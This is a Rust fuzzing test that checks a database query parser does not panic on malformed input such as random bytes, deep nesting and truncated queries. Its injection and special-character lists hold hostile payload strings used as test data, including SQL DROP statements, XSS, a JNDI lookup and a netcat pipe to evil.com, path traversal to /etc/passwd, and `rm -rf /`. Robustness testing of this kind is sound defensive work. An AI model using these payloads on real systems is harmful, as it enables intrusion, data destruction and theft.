
use jasonisnthappy::core::query::parser::parse_query;
use rand::Rng;

#[test]
fn test_query_parser_fuzzing() {
    println!("=== Query Parser Fuzzing Test ===");
    println!("Testing: Query parser robustness with malformed inputs\n");

    let mut total_tests = 0;

    let categories: Vec<(&str, fn() -> usize)> = vec![
        ("Random Binary Garbage", test_random_binary_garbage),
        ("Random Unicode Chaos", test_random_unicode_chaos),
        ("Malformed Syntax", test_malformed_syntax),
        ("Extreme Nesting", test_extreme_nesting),
        ("Extreme Length", test_extreme_length),
        ("Special Characters", test_special_characters),
        ("Injection Attempts", test_injection_attempts),
        ("Edge Cases", test_edge_cases),
        ("Truncated Queries", test_truncated_queries),
        ("Repeated Tokens", test_repeated_tokens),
    ];

    for (name, test_fn) in categories {
        println!("\n--- Category: {} ---", name);
        let tests_run = test_fn();
        total_tests += tests_run;
        println!("✓ {}: {} tests passed", name, tests_run);
    }

    println!("\n✓ SUCCESS: Parser handled {} malformed inputs gracefully", total_tests);
    println!("  - No panics: ✓");
    println!("  - All errors returned properly: ✓");
}

fn test_random_binary_garbage() -> usize {
    let mut rng = rand::thread_rng();
    let mut count = 0;

    for i in 0..1000 {
        let length = 1 + (i % 1000);
        let garbage: Vec<u8> = (0..length).map(|_| rng.gen()).collect();

        let query = String::from_utf8_lossy(&garbage);
        test_parse_no_fail(&query, "random binary garbage");
        count += 1;
    }

    count
}

fn test_random_unicode_chaos() -> usize {
    let mut count = 0;

    for i in 0..500 {
        let length = 10 + (i % 100);
        let mut query = String::new();

        for j in 0..length {
            let codepoint = ((i * j) % 0x10FFFF) + 1;
            if let Some(c) = char::from_u32(codepoint as u32) {
                query.push(c);
            }
        }

        test_parse_no_fail(&query, "unicode chaos");
        count += 1;
    }

    count
}

fn test_malformed_syntax() -> usize {
    let malformed = vec![
        "age >",
        "age >=",
        "age <",
        "name is",
        "tags has",

        "age 18",
        "name alice",
        "city",

        "(age > 18",
        "age > 18)",
        "((age > 18)",
        "(age > 18))",
        "(((age > 18",

        "tags has any [go",
        "tags has any go]",
        "tags has any [[go]",
        "tags has any [go]]",

        "age >> 18",
        "age << 18",
        "age === 18",
        "age != 18",
        "age <> 18",

        "age > < 18",
        "age >= <= 18",
        "age is is 18",

        "> 18",
        "is alice",
        "exists",
        "has go",

        "age > 18 and",
        "age > 18 or",
        "and age > 18",
        "or age > 18",

        "age > 18 and and city is delhi",
        "age > 18 or or city is delhi",

        "age exists 18",
        "not",
        "not not age > 18",

        "tags has any",
        "tags has all",
        "tags has any []",
        "tags has all [",

        "address.",
        "address.city.",
        "address..city",

        r#""unclosed string"#,
        r#"name is "unclosed"#,
        r#"""#,

        "",
        "   ",
        "\t\n",

        "and",
        "or",
        "not",
        ">",
        "<",
        "is",

        "()",
        "[]",
        "(())",
        "[[]]",
        ",,,",

        "age > 18 and ) or ( city",
        "((( ))) [[[ ]]]",
        "age and or not > < is 18",
        "> is < and or not exists has",

        "age > true",
        "age > exists",
        "age > and",

        "age > 18, 19, 20",
        "tags has [,,,]",
        "tags has [go,,,rust]",
    ];

    for query in &malformed {
        test_parse_no_fail(query, "malformed syntax");
    }

    malformed.len()
}

fn test_extreme_nesting() -> usize {
    let mut count = 0;

    for depth in 1..=100 {
        let opening = "(".repeat(depth);
        let closing = ")".repeat(depth);
        let query = format!("{}age > 18{}", opening, closing);
        test_parse_no_fail(&query, "deep nesting");
        count += 1;
    }

    for depth in 1..=50 {
        let parts = vec!["age > 18"; depth];
        let query = parts.join(" and ");
        test_parse_no_fail(&query, "logical nesting");
        count += 1;
    }

    for depth in 1..=50 {
        let parts: Vec<String> = (0..depth).map(|i| format!("field{}", i)).collect();
        let query = format!("{} is value", parts.join("."));
        test_parse_no_fail(&query, "field nesting");
        count += 1;
    }

    count
}

fn test_extreme_length() -> usize {
    let mut count = 0;

    for length in (100..=10000).step_by(1000) {
        let field = "a".repeat(length);
        let query = format!("{} is value", field);
        test_parse_no_fail(&query, "long field name");
        count += 1;
    }

    for length in (100..=10000).step_by(1000) {
        let value = "x".repeat(length);
        let query = format!(r#"name is "{}""#, value);
        test_parse_no_fail(&query, "long string value");
        count += 1;
    }

    for size in (100..=1000).step_by(100) {
        let values: Vec<String> = (0..size).map(|i| format!("val{}", i)).collect();
        let query = format!("tags has any [{}]", values.join(", "));
        test_parse_no_fail(&query, "long array");
        count += 1;
    }

    let parts = vec!["age > 18"; 10000];
    let query = parts.join(" and ");
    test_parse_no_fail(&query, "extremely long query");
    count += 1;

    count
}

fn test_special_characters() -> usize {
    let special_chars = vec![
        "\x00",
        "\x01\x02\x03",
        "\n\r\t",
        "😀😁😂🤣",
        "数据库查询",
        "قاعدة البيانات",
        "データベース",
        "🔥💻🚀",
        "\\n\\r\\t",
        "'; DROP TABLE",
        "<script>",
        "../../etc/passwd",
        "${code}",
        "`rm -rf /`",
        "\x1b[31m",
        "🏴‍☠️",
    ];

    let mut count = 0;
    for char in &special_chars {
        test_parse_no_fail(&format!("{} is value", char), "special char as field");
        count += 1;

        test_parse_no_fail(&format!("field is {}", char), "special char as value");
        count += 1;

        test_parse_no_fail(char, "special char as query");
        count += 1;
    }

    count
}

fn test_injection_attempts() -> usize {
    let injections = vec![
        "'; DROP DATABASE test; --",
        "1' OR '1'='1",
        "admin'--",
        "' OR 1=1--",
        "'; DELETE FROM users--",
        "<script>alert('XSS')</script>",
        "${jndi:ldap://evil.com/a}",
        "{{7*7}}",
        "#{7*7}",
        "${{7*7}}",
        "../../../../etc/passwd",
        "..\\..\\..\\windows\\system32",
        "%0a%0d",
        r#""; system('ls');"#,
        "` | nc evil.com 1234`",
    ];

    for injection in &injections {
        test_parse_no_fail(injection, "injection attempt");
    }

    injections.len()
}

fn test_edge_cases() -> usize {
    let edges = vec![
        format!("age > {}", f64::MAX),
        format!("age < {}", f64::MIN),
        format!("age is {}", i64::MAX),
        format!("age is -{}", i64::MAX),
    ];

    let static_edges = vec![
        "age > 0.0000000000000001",
        "age > 999999999999999999999999999999",

        r#"name is """#,
        r#""" is name"#,
        r#"tags has """#,

        "   age   >   18   ",
        "\t\tage\t>\t18\t\t",
        "\n\nage\n>\n18\n\n",

        "a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p is value",

        "AGE > 18",
        "Age > 18",
        "aGe > 18",

        "and is value",
        "or is value",
        "not is value",
        "exists is value",
        "has is value",
        "is is value",
        "true is value",
        "false is value",
        "null is value",

        "age > 18 AND city is delhi",
        "age > 18 Or city is delhi",
        "NOT age > 18",
        "Age EXISTS",
        "Tags HAS go",

        "age    >    18",
        "age>18",
        "age  is  not  null",
    ];

    for edge in &edges {
        test_parse_no_fail(edge, "edge case");
    }

    for edge in &static_edges {
        test_parse_no_fail(edge, "edge case");
    }

    edges.len() + static_edges.len()
}

fn test_truncated_queries() -> usize {
    let valid_queries = vec![
        "age > 18 and city is delhi",
        "(age > 18 or age < 65) and active is true",
        "tags has any [go, rust, python]",
        "address.city.name is bangalore",
    ];

    let mut count = 0;
    for valid in &valid_queries {
        for i in 1..valid.len() {
            let truncated = &valid[..i];
            test_parse_no_fail(truncated, "truncated query");
            count += 1;
        }
    }

    count
}

fn test_repeated_tokens() -> usize {
    let patterns = vec![
        format!("{}age > 18", "and ".repeat(100)),
        format!("{}age > 18", "or ".repeat(100)),
        format!("{}age > 18", "not ".repeat(100)),
        format!("{}age > 18{}", "(".repeat(100), ")".repeat(100)),
        format!("tags has any [{}rust]", "go, ".repeat(100)),
        format!("{}age is 18", "age is 18 and ".repeat(100)),
    ];

    for pattern in &patterns {
        test_parse_no_fail(pattern, "repeated tokens");
    }

    patterns.len()
}

fn test_parse_no_fail(query: &str, category: &str) {
    let result = std::panic::catch_unwind(|| {
        let _ = parse_query(query);
    });

    if result.is_err() {
        panic!(
            "❌ PANIC on {}: query={:?}",
            category,
            truncate_for_log(query)
        );
    }

}

fn truncate_for_log(s: &str) -> String {
    if s.len() <= 100 {
        s.to_string()
    } else {
        format!("{}...", &s[..97])
    }
}
